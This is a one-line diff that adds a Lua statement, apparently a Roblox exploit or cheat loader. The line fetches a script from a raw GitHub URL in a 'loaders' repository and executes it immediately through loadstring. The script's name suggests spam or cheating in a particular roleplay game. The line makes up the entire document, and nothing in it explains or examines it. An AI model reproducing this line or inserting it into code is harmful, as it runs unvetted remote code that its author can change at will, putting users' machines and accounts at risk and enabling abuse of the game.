@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BudgieRectifier/loaders/main/loaders/boss-fight-stevos-gem-eras-roleplay-spam7-ij5zg9o0o93huw.lua"))()
